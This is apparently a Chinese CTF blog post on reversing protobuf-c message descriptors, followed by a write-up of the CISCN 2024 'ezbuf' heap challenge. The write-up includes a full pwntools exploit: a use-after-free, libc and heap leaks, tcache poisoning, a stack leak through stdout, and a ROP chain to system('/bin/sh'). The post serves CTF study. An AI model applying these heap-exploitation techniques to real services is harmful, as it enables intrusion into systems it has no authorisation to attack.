<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Protobuf pwn | Y4ng's blog</title>
<meta name=keywords content="pwn,protobuf"><meta name=description content="æ„Ÿè§‰ä¸å¦‚JSONğŸ¤·â€â™‚ï¸"><meta name=author content="Y4ng"><link rel=canonical href=http://localhost:1313/posts/pwn/protobuf/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script><meta name=referrer content="no-referrer-when-downgrade"><link crossorigin=anonymous href=/assets/css/stylesheet.e1474971e42244c08dee58b60981bfa4e72376a0f69f168d4e9ca406b76e60bf.css integrity="sha256-4UdJceQiRMCN7li2CYG/pOcjdqD2nxaNTpykBrduYL8=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/static/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/static/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/static/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/static/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/static/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=http://localhost:1313/posts/pwn/protobuf/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=text/javascript async src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">MathJax.Hub.Config({tex2jax:{inlineMath:[["$","$"],["\\(","\\)"]],displayMath:[["$$","$$"],["[[","]]"]],processEscapes:!0,processEnvironments:!0,skipTags:["script","noscript","style","textarea","pre"],TeX:{equationNumbers:{autoNumber:"AMS"},extensions:["AMSmath.js","AMSsymbols.js"]}},"HTML-CSS":{availableFonts:["Arial","TeX"],preferredFont:"TeX",webFont:"TeX"}}),MathJax.Hub.Queue(function(){var e,t=MathJax.Hub.getAllJax();for(e=0;e<t.length;e+=1)t[e].SourceElement().parentNode.className+=" has-jax"})</script><style>code.has-jax{font:inherit;font-size:100%;background:inherit;border:inherit;color:#515151}</style><html><head><link href=https://fonts.cdnfonts.com/css/code-new-roman rel=stylesheet><link href=https://fonts.cdnfonts.com/css/jetbrains-mono-2 rel=stylesheet><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@100..900&display=swap" rel=stylesheet></head></html><meta property="og:title" content="Protobuf pwn"><meta property="og:description" content="æ„Ÿè§‰ä¸å¦‚JSONğŸ¤·â€â™‚ï¸"><meta property="og:type" content="article"><meta property="og:url" content="http://localhost:1313/posts/pwn/protobuf/"><meta property="og:image" content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-05-22T16:34:26+08:00"><meta property="article:modified_time" content="2024-05-22T16:34:26+08:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Protobuf pwn"><meta name=twitter:description content="æ„Ÿè§‰ä¸å¦‚JSONğŸ¤·â€â™‚ï¸"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"Pwn","item":"http://localhost:1313/posts/pwn/"},{"@type":"ListItem","position":3,"name":"Protobuf pwn","item":"http://localhost:1313/posts/pwn/protobuf/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Protobuf pwn","name":"Protobuf pwn","description":"æ„Ÿè§‰ä¸å¦‚JSONğŸ¤·â€â™‚ï¸","keywords":["pwn","protobuf"],"articleBody":" Protobuf pwn Introduction Protocol Buffers are language-neutral, platform-neutral extensible mechanisms for serializing structured data.\ngoogleå‘æ˜çš„ä¸€ä¸ªæ•°æ®æ ¼å¼ï¼Œå¹³å°å…¼å®¹æ€§å’Œè¯­è¨€å…¼å®¹æ€§éƒ½éå¸¸å¥½ï¼Œèƒ½å¤Ÿå°†æ•°æ®ç»“æ„ä½“è½¬æ¢æˆbyteså½¢å¼å‘é€ï¼Œä¹Ÿèƒ½å°†bytesæµååºåˆ—åŒ–ä¸ºç»“æ„ä½“ï¼ˆå¯æ˜¯ğŸ‘¨é€‰æ‹©json\nInstall protobuf on Ubuntu # install protobuf git clone -b v3.21.0 https://github.com/protocolbuffers/protobuf.git # å¤§äº3.20éƒ½ok sudo apt-get install autoconf automake libtool curl make g++ unzip # ä¸€äº›ä¾èµ– sudo ./autogen.sh #ç”Ÿæˆé…ç½®è„šæœ¬ sudo ./configure # å¯é€‰ --prefix=path ï¼Œé»˜è®¤è·¯å¾„ä¸º/usr/local/ make -j`nproc` sudo make install sudo ldconfig # refresh shared library cache which protoc # find the location protoc --version # check # install protobuf-c git clone https://github.com/protobuf-c/protobuf-c.git ./autogen.sh \u0026\u0026 ./configure make -j8 # å¼€nprocç»™æˆ‘å¡æ­»äº†... sudo make install ğŸ‘¨çš„åƒåœ¾è™šæ‹Ÿæœºç¼–è¯‘å®‰è£…æ˜¯çœŸçš„ä¸€å¨ğŸ’©\nTo reverse protobuf å…ˆåˆ›å»ºä¸€ä¸ªxxx.protoæ–‡ä»¶\nsyntax=\"proto3\"; //proto version 2 or 3 message devicemsg{ bytes whatcon = 1; sint64 whattodo = 2; sint64 whatidx = 3; sint64 whatsize = 4; uint32 whatsthis = 5; } Cè¯­è¨€ä¸‹åˆ†æ è¾“å…¥ä»¥ä¸‹å‘½ä»¤\nprotoc --c_out=./ devicemsg.proto â€“c_out=./ : å°†.protoæ–‡ä»¶ä»¥Cè¯­è¨€æ ¼å¼è¾“å‡ºåœ¨å½“å‰ç›®å½•ä¸‹\nåˆ†æ.cæ–‡ä»¶\nåºåˆ—åŒ–å’Œååºåˆ—åŒ–å‡½æ•° size_t devicemsg__pack (const Devicemsg *message, uint8_t *out) //åºåˆ—åŒ– { assert(message-\u003ebase.descriptor == \u0026devicemsg__descriptor); return protobuf_c_message_pack ((const ProtobufCMessage*)message, out); } Devicemsg *devicemsg__unpack(ProtobufCAllocator *allocator, size_t len, const uint8_t *data) // ååºåˆ—åŒ– { return (Devicemsg *)protobuf_c_message_unpack(\u0026devicemsg__descriptor,allocator, len, data); } ç»“æ„ä½“ä¿¡æ¯ static const ProtobufCFieldDescriptor devicemsg__field_descriptors[5] = { { \"whatcon\", 1, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_BYTES, 0, /* quantifier_offset */ offsetof(Devicemsg, whatcon), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, { \"whattodo\", 2, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_SINT64, 0, /* quantifier_offset */ offsetof(Devicemsg, whattodo), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, { \"whatidx\", 3, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_SINT64, 0, /* quantifier_offset */ offsetof(Devicemsg, whatidx), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, { \"whatsize\", 4, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_SINT64, 0, /* quantifier_offset */ offsetof(Devicemsg, whatsize), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, { \"whatsthis\", 5, PROTOBUF_C_LABEL_NONE, PROTOBUF_C_TYPE_UINT32, 0, /* quantifier_offset */ offsetof(Devicemsg, whatsthis), NULL, NULL, 0, /* flags */ 0,NULL,NULL /* reserved1,reserved2, etc */ }, }; static const unsigned devicemsg__field_indices_by_name[] = { 0, /* field[0] = whatcon */ 2, /* field[2] = whatidx */ 3, /* field[3] = whatsize */ 4, /* field[4] = whatsthis */ 1, /* field[1] = whattodo */ }; static const ProtobufCIntRange devicemsg__number_ranges[1 + 1] = { { 1, 0 }, { 0, 5 } }; const ProtobufCMessageDescriptor devicemsg__descriptor = { PROTOBUF_C__MESSAGE_DESCRIPTOR_MAGIC, \"devicemsg\", \"Devicemsg\", \"Devicemsg\", \"\", sizeof(Devicemsg), 5, devicemsg__field_descriptors, devicemsg__field_indices_by_name, 1, devicemsg__number_ranges, (ProtobufCMessageInit) devicemsg__init, NULL,NULL,NULL /* reserved[123] */ }; å¯ä»¥çœ‹åˆ°æ¯ä¸€ä¸ªç»“æ„ä½“ä¸­ï¼Œå­—æ®µä¿¡æ¯åˆ†åˆ«æ˜¯æˆå‘˜åç§°ï¼Œåºå·ç´¢å¼•ï¼Œæ ‡ç­¾ï¼Œæ•°æ®ç±»å‹ï¼Œé™å®šç¬¦å­—æ®µåç§»ï¼ˆä¿ºä¹Ÿæ²¡å¼„æ‡‚ï¼Œåç§»é‡ï¼ˆå’Œç»“æ„ä½“é¦–åœ°å€çš„ï¼‰â€¦\nç±»å‹è¡¨ typedef enum { PROTOBUF_C_TYPE_INT32, /**\u003c int32 */ PROTOBUF_C_TYPE_SINT32, /**\u003c signed int32 */ PROTOBUF_C_TYPE_SFIXED32, /**\u003c signed int32 (4 bytes) */ PROTOBUF_C_TYPE_INT64, /**\u003c int64 */ PROTOBUF_C_TYPE_SINT64, /**\u003c signed int64 */ PROTOBUF_C_TYPE_SFIXED64, /**\u003c signed int64 (8 bytes) */ PROTOBUF_C_TYPE_UINT32, /**\u003c unsigned int32 */ PROTOBUF_C_TYPE_FIXED32, /**\u003c unsigned int32 (4 bytes) */ PROTOBUF_C_TYPE_UINT64, /**\u003c unsigned int64 */ PROTOBUF_C_TYPE_FIXED64, /**\u003c unsigned int64 (8 bytes) */ PROTOBUF_C_TYPE_FLOAT, /**\u003c float */ PROTOBUF_C_TYPE_DOUBLE, /**\u003c double */ PROTOBUF_C_TYPE_BOOL, /**\u003c boolean */ PROTOBUF_C_TYPE_ENUM, /**\u003c enumerated type */ PROTOBUF_C_TYPE_STRING, /**\u003c UTF-8 or ASCII string */ PROTOBUF_C_TYPE_BYTES, /**\u003c arbitrary byte sequence */ PROTOBUF_C_TYPE_MESSAGE, /**\u003c nested message */ } ProtobufCType; ä»0åˆ°0x10\næè¿°ç¬¦ç»“æ„ä½“ /** * Describes a message. */ struct ProtobufCMessageDescriptor { /** Magic value checked to ensure that the API is used correctly. */ uint32_t\tmagic; /** The qualified name (e.g., \"namespace.Type\"). */ const char\t*name; /** The unqualified name as given in the .proto file (e.g., \"Type\"). */ const char\t*short_name; /** Identifier used in generated C code. */ const char\t*c_name; /** The dot-separated namespace. */ const char\t*package_name; /** * Size in bytes of the C structure representing an instance of this * type of message. */ size_t\tsizeof_message; /** Number of elements in `fields`. */ unsigned\tn_fields; /** Field descriptors, sorted by tag number. */ const ProtobufCFieldDescriptor\t*fields; /** Used for looking up fields by name. */ const unsigned\t*fields_sorted_by_name; /** Number of elements in `field_ranges`. */ unsigned\tn_field_ranges; /** Used for looking up fields by id. */ const ProtobufCIntRange\t*field_ranges; /** Message initialisation function. */ ProtobufCMessageInit\tmessage_init; /** Reserved for future use. */ void\t*reserved1; /** Reserved for future use. */ void\t*reserved2; /** Reserved for future use. */ void\t*reserved3; }; important:\nmagicï¼Œä¸€èˆ¬ä¸º0x28AAEEF9 n_fieldsï¼Œå…³ç³»åˆ°åŸå§‹çš„messageç»“æ„å†…æœ‰å‡ æ¡è®°å½•ã€ fieldsï¼Œè¿™ä¸ªæŒ‡å‘messageå†…æ‰€æœ‰è®°å½•ç±»å‹ç»„æˆçš„ä¸€ä¸ªæ•°ç»„ï¼Œå¯ä»¥å€Ÿæ­¤é€†å‘åˆ†æmessageç»“æ„ã€‚ fieldç»“æ„ä½“ è¿™ä¸ªç»“æ„ä½“å°±æ˜¯ä¸Šæ–‡è¯´çš„å‚¨å­˜åç§°ï¼Œåç§»é‡çš„ï¼Œä¹Ÿæ˜¯IDAé‡Œé¢çœ‹åˆ°çš„\nstruct ProtobufCFieldDescriptor { /** Name of the field as given in the .proto file. */ const char\t*name; /** Tag value of the field as given in the .proto file. */ uint32_t\tid; /** Whether the field is `REQUIRED`, `OPTIONAL`, or `REPEATED`. */ ProtobufCLabel\tlabel; /** The type of the field. */ ProtobufCType\ttype; /** * The offset in bytes of the message's C structure's quantifier field * (the `has_MEMBER` field for optional members or the `n_MEMBER` field * for repeated members or the case enum for oneofs). */ unsigned\tquantifier_offset; /** * The offset in bytes into the message's C structure for the member * itself. */ unsigned\toffset; /** * A type-specific descriptor. * * If `type` is `PROTOBUF_C_TYPE_ENUM`, then `descriptor` points to the * corresponding `ProtobufCEnumDescriptor`. * * If `type` is `PROTOBUF_C_TYPE_MESSAGE`, then `descriptor` points to * the corresponding `ProtobufCMessageDescriptor`. * * Otherwise this field is NULL. */ const void\t*descriptor; /* for MESSAGE and ENUM types */ /** The default value for this field, if defined. May be NULL. */ const void\t*default_value; /** * A flag word. Zero or more of the bits defined in the * `ProtobufCFieldFlag` enum may be set. */ uint32_t\tflags; /** Reserved for future use. */ unsigned\treserved_flags; /** Reserved for future use. */ void\t*reserved2; /** Reserved for future use. */ void\t*reserved3; }; å…·ä½“ä¿¡æ¯å¯çœ‹protobuf-c\nUse protobuf with python è¾“å…¥å‘½ä»¤\nprotoc --python_out=./ devicemsg.proto ç”Ÿæˆdevicemsg_pb2.py\næ¨¡æ¿ import devicemsg_pb2 data = devicemsg_pb2.devicemsg() # æ–¹æ³•åç§°è·Ÿéš.protoä¸­ç»“æ„ä½“åç§°å˜åŒ– data.whattodo = todo data.whatcon = content data.whatidx = idx data.whatsize = size data.whatsthis = this data.SerializeToString() # è½¬æ¢æˆbytes CISCN 2024 ezbuf ğŸ‘¨åšè¿™é¢˜çš„æ—¶å€™ç”šè‡³ä¸çŸ¥é“protobufæ˜¯ä»€ä¹ˆ\næ¢å¤ç»“æ„ä½“ å…³é”®ç»“æ„ä½“åœ¨è¿™ï¼Œ1ä»£è¡¨åºå·1ï¼Œ3ä»£è¡¨labelï¼Œ0XFä»£è¡¨ç±»å‹ï¼ŒæŸ¥è¡¨å³å¯\næ ¹æ®ä»¥ä¸Šå­—æ®µæ¢å¤å‡ºprotobufç»“æ„ä½“\nsyntax=\"proto3\"; message devicemsg{ bytes whatcon = 1; sint64 whattodo = 2; sint64 whatidx = 3; sint64 whatsize = 4; uint32 whatsthis = 5; } ä»£ç åˆ†æ å…¥å£ åç§»å’Œ.data.rel.roä¸­çš„ç¬¬äº”ä¸ªå­—æ®µæ­£å¥½å¯¹åº”ä¸Š,é™¤äº†v4+32\nä»a2-a6åˆ†åˆ«æ˜¯ï¼Œcontent todo idx size this\nèœå• å‡½æ•°0æ˜¯ä»€ä¹ˆéƒ½ä¸å¹²ï¼Œçº¯è§£ææˆ‘ä»¬å‘åŒ…çš„æ•°æ®ï¼Œä½†æ˜¯ä¼šæ ¹æ®æ•°æ®é•¿åº¦åˆ†é…å¯¹åº”å †ï¼Œå¦‚func0(str) â€“\u003e malloc(len(str))\nå‡½æ•°1æ˜¯ç”³è¯·0x30çš„chunkï¼Œç„¶åcopyæ•°æ®è¿›å»\nå‡½æ•°2æ˜¯freeï¼Œé‡Œé¢æœ‰UAF\nå‡½æ•°3æ˜¯æ‰“å°æˆ‘ä»¬ç”³è¯·chunkçš„æ•°æ®ï¼Œè¶…è¿‡ä¸¤æ¬¡å…³é—­æ ‡å‡†è¾“å‡ºå’Œé”™è¯¯\næ¼æ´åˆ©ç”¨ é€šè¿‡é—ç•™çš„unsorted binçš„bkæ¥å¾—åˆ°libcçš„åœ°å€ï¼Œç„¶åé€šè¿‡é‡Šæ”¾ç¬¬ä¸€ä¸ª0x40å¤§å°çš„chunkè¿›å…¥tcacheï¼Œæ‰“å°å‡ºæ¥heapåœ°å€ï¼ŒUAFä¿®æ”¹tcacheçš„fd\nç”³è¯·åˆ°tcache_perthread_struct,å°†environåœ°å€æ·»åŠ åˆ°sizeä¸º0x40çš„tcacheå †å—ä¸Šï¼Œæ³„éœ²å‡ºstackåœ°å€\nä¿®æ”¹rspæŒ‡é’ˆï¼Œåœ¨æ ˆä¸Šæ‰“ORW\nexp from pwn import * import devicemsg_pb2 binary_path = './pwn' libc_path = \"./libc.so.6\" context(arch=\"amd64\",os=\"linux\",log_level=\"debug\",terminal = ['tmux','splitw','-h']) elf = ELF(binary_path) libc = ELF(libc_path) argv = f'' p=process(argv=[binary_path, argv]) #p=remote('0.0.0.0',10002) leak_addr = lambda name,addr: log.success(f'{name}-----\u003e'+hex(addr)) main_arena_offset = libc.symbols[\"__malloc_hook\"] + 0x10 #global_max_fast_offset = 0x3c67f8 #free_hook_offset = libc.symbols[\"__free_hook\"] data = devicemsg_pb2.devicemsg() def debug(): gdb.attach(p) pause() def add(idx,content): data.whattodo = 1 data.whatcon = content data.whatidx = idx data.whatsize=0 data.whatsthis=0 p.sendafter(b\"WHAT DO YOU WANT?\",data.SerializeToString()) def show(idx): data.whatcon=b\"0\" data.whattodo=3 data.whatidx=idx data.whatsize=0x20 data.whatsthis=0x20 p.sendafter(\"WHAT DO YOU WANT?\",data.SerializeToString()) def dele(idx): data.whatcon=b\"B\"*0xc0 data.whattodo=2 data.whatidx=idx data.whatsize=0x20 data.whatsthis=0x20 p.sendafter(\"WHAT DO YOU WANT?\",data.SerializeToString()) def clean(mem): data.whatcon=mem data.whattodo=0 data.whatidx=0 data.whatsize=0x20 data.whatsthis=0x20 p.sendafter(\"WHAT DO YOU WANT?\",data.SerializeToString()) def pwn(): for i in range(9): add(i,b\"y4ngy4ng\") show(0) p.recvuntil(b\"y4ngy4ng\") libc_addr= u64(p.recv(6).ljust(0x8,b\"\\x00\")) - 0x21ace0 leak_addr(\"libc_addr\",libc_addr) dele(0) show(0) p.recvuntil(\"Content:\") heap_base = (u64(p.recv(5).ljust(0x8,b\"\\x00\")) \u003c\u003c 12) - 0x2000 leak_addr(\"heap_base\",heap_base) for i in range(6): dele(i+1) dele(7) dele(8) dele(7) for i in range(7): add(i,b\"A\"*0x8) environ = libc.sym['environ'] + libc_addr stdout = libc.sym['_IO_2_1_stdout_'] + libc_addr add(7,p64((heap_base+0xf0) ^((heap_base+0x4e40)\u003e\u003e12))) add(8,b\"AAAAAA\") add(8,b\"A\") add(8,p64(0)+p64(heap_base+0x10)) #debug() clean((((p16(0)*2+p16(1)+p16(1)).ljust(0x10,b\"\\x00\")+p16(1)+p16(1)).ljust(0x90,b'\\x00')+p64(stdout)+p64(stdout)+p64(0)*5+p64(heap_base+0x10)).ljust(0xe0,b\"\\x00\")) #raw_input() clean(p64(0xFBAD1800)+p64(0)*3+p64(environ)+p64(environ+8)) #debug() stack = u64(p.recvuntil(\"\\x7f\")[-6:].ljust(0x8,b\"\\x00\")) - 0x1a8 + 0x40 - 0x28 leak_addr(\"stack\",stack) #raw_input() #debug() clean((((p16(0)*2+p16(0)+p16(0)+p16(1)).ljust(0x10,b\"\\x00\")+p16(1)+p16(1)).ljust(0x90,b'\\x00')+p64(0)+p64(0)+p64(stack)).ljust(0xa0,b\"\\x00\")) #raw_input() pop_rdi = 0x000000000002a3e5 + libc_addr system = libc.sym['system'] + libc_addr binsh = next(libc.search(b\"/bin/sh\\x00\")) + libc_addr ret = 0x000000000002a3e6 + libc_addr debug() clean((b\"a\"*0x28+p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system)).ljust(0x58,b\"\\x00\")) p.interactive() if __name__ == \"__main__\": pwn() å‚è€ƒ ACT TEAM\n","wordCount":"1164","inLanguage":"en","image":"http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-05-22T16:34:26+08:00","dateModified":"2024-05-22T16:34:26+08:00","author":[{"@type":"Person","name":"Y4ng"}],"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:1313/posts/pwn/protobuf/"},"publisher":{"@type":"Organization","name":"Y4ng's blog","logo":{"@type":"ImageObject","url":"http://localhost:1313/static/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=http://localhost:1313/ accesskey=h title="Home (Alt + H)"><img src=http://localhost:1313/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=http://localhost:1313/search title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=http://localhost:1313/posts title=posts><span>posts</span></a></li><li><a href=http://localhost:1313/categories title=categories><span>categories</span></a></li><li><a href=http://localhost:1313/about/ title=about><span>about</span></a></li><li><a href=http://localhost:1313/links title=friends><span>friends</span></a></li></ul></nav></header><main class=main><article class=post autonumbering><header class=post-header><div class=breadcrumbs><a href=http://localhost:1313/>Home</a>&nbsp;Â»&nbsp;<a href=http://localhost:1313/posts/>Posts</a>&nbsp;Â»&nbsp;<a href=http://localhost:1313/posts/pwn/>Pwn</a></div><h1 class="post-title entry-hint-parent">Protobuf pwn</h1><div class=post-description>æ„Ÿè§‰ä¸å¦‚JSONğŸ¤·â€â™‚ï¸</div><div class=post-meta><span title='2024-05-22 16:34:26 +0800 CST'>2024-05-22</span>&nbsp;Â·&nbsp;6 min&nbsp;Â·&nbsp;1164 words&nbsp;Â·&nbsp;Y4ng</header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#install-protobuf-on-ubuntu>Install protobuf on Ubuntu</a></li><li><a href=#to-reverse-protobuf>To reverse protobuf</a><ul><li><a href=#cè¯­è¨€ä¸‹åˆ†æ>Cè¯­è¨€ä¸‹åˆ†æ</a></li><li><a href=#åºåˆ—åŒ–å’Œååºåˆ—åŒ–å‡½æ•°>åºåˆ—åŒ–å’Œååºåˆ—åŒ–å‡½æ•°</a></li><li><a href=#ç»“æ„ä½“ä¿¡æ¯>ç»“æ„ä½“ä¿¡æ¯</a></li><li><a href=#ç±»å‹è¡¨>ç±»å‹è¡¨</a></li><li><a href=#æè¿°ç¬¦ç»“æ„ä½“>æè¿°ç¬¦ç»“æ„ä½“</a></li><li><a href=#fieldç»“æ„ä½“>fieldç»“æ„ä½“</a></li></ul></li><li><a href=#use-protobuf-with-python>Use protobuf with python</a><ul><li><a href=#æ¨¡æ¿>æ¨¡æ¿</a></li></ul></li><li><a href=#ciscn-2024-ezbuf>CISCN 2024 ezbuf</a><ul><li><a href=#æ¢å¤ç»“æ„ä½“>æ¢å¤ç»“æ„ä½“</a></li><li><a href=#ä»£ç åˆ†æ>ä»£ç åˆ†æ</a></li><li><a href=#æ¼æ´åˆ©ç”¨>æ¼æ´åˆ©ç”¨</a></li><li><a href=#exp>exp</a></li></ul></li><li><a href=#å‚è€ƒ>å‚è€ƒ</a></li></ul></nav></div></details></div><div class=post-content><h1 id=protobuf-pwn>Protobuf pwn<a hidden class=anchor aria-hidden=true href=#protobuf-pwn>#</a></h1><h2 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h2><p><del>Protocol Buffers are language-neutral, platform-neutral extensible mechanisms for serializing structured data.</del></p><p>googleå‘æ˜çš„ä¸€ä¸ªæ•°æ®æ ¼å¼ï¼Œå¹³å°å…¼å®¹æ€§å’Œè¯­è¨€å…¼å®¹æ€§éƒ½éå¸¸å¥½ï¼Œèƒ½å¤Ÿå°†æ•°æ®ç»“æ„ä½“è½¬æ¢æˆbyteså½¢å¼å‘é€ï¼Œä¹Ÿèƒ½å°†bytesæµååºåˆ—åŒ–ä¸ºç»“æ„ä½“ï¼ˆå¯æ˜¯ğŸ‘¨é€‰æ‹©json</p><h2 id=install-protobuf-on-ubuntu>Install protobuf on Ubuntu<a hidden class=anchor aria-hidden=true href=#install-protobuf-on-ubuntu>#</a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># install protobuf</span>
</span></span><span class=line><span class=cl>git clone -b v3.21.0 https://github.com/protocolbuffers/protobuf.git <span class=c1># å¤§äº3.20éƒ½ok</span>
</span></span><span class=line><span class=cl>sudo apt-get install autoconf automake libtool curl make g++ unzip <span class=c1># ä¸€äº›ä¾èµ–</span>
</span></span><span class=line><span class=cl>sudo ./autogen.sh   <span class=c1>#ç”Ÿæˆé…ç½®è„šæœ¬</span>
</span></span><span class=line><span class=cl>sudo ./configure    <span class=c1># å¯é€‰ --prefix=path ï¼Œé»˜è®¤è·¯å¾„ä¸º/usr/local/</span>
</span></span><span class=line><span class=cl>make -j<span class=sb>`</span>nproc<span class=sb>`</span>          
</span></span><span class=line><span class=cl>sudo make install 
</span></span><span class=line><span class=cl>sudo ldconfig       <span class=c1># refresh shared library cache</span>
</span></span><span class=line><span class=cl>which protoc        <span class=c1># find the location</span>
</span></span><span class=line><span class=cl>protoc --version    <span class=c1># check</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># install protobuf-c</span>
</span></span><span class=line><span class=cl>git clone https://github.com/protobuf-c/protobuf-c.git
</span></span><span class=line><span class=cl>./autogen.sh <span class=o>&amp;&amp;</span> ./configure 
</span></span><span class=line><span class=cl>make -j8  <span class=c1># å¼€nprocç»™æˆ‘å¡æ­»äº†...</span>
</span></span><span class=line><span class=cl>sudo make install
</span></span></code></pre></div><p>ğŸ‘¨çš„åƒåœ¾è™šæ‹Ÿæœºç¼–è¯‘å®‰è£…æ˜¯çœŸçš„ä¸€å¨ğŸ’©</p><h2 id=to-reverse-protobuf>To reverse protobuf<a hidden class=anchor aria-hidden=true href=#to-reverse-protobuf>#</a></h2><p>å…ˆåˆ›å»ºä¸€ä¸ª<code>xxx.proto</code>æ–‡ä»¶</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>syntax</span><span class=o>=</span><span class=s>&#34;proto3&#34;</span><span class=p>;</span> <span class=c1>//proto version 2 or 3
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=n>message</span> <span class=n>devicemsg</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>bytes</span> <span class=n>whatcon</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>sint64</span> <span class=n>whattodo</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>sint64</span> <span class=n>whatidx</span> <span class=o>=</span> <span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>sint64</span> <span class=n>whatsize</span> <span class=o>=</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>uint32</span> <span class=n>whatsthis</span> <span class=o>=</span> <span class=mi>5</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><h3 id=cè¯­è¨€ä¸‹åˆ†æ>Cè¯­è¨€ä¸‹åˆ†æ<a hidden class=anchor aria-hidden=true href=#cè¯­è¨€ä¸‹åˆ†æ>#</a></h3><p>è¾“å…¥ä»¥ä¸‹å‘½ä»¤</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>protoc --c_out<span class=o>=</span>./ devicemsg.proto
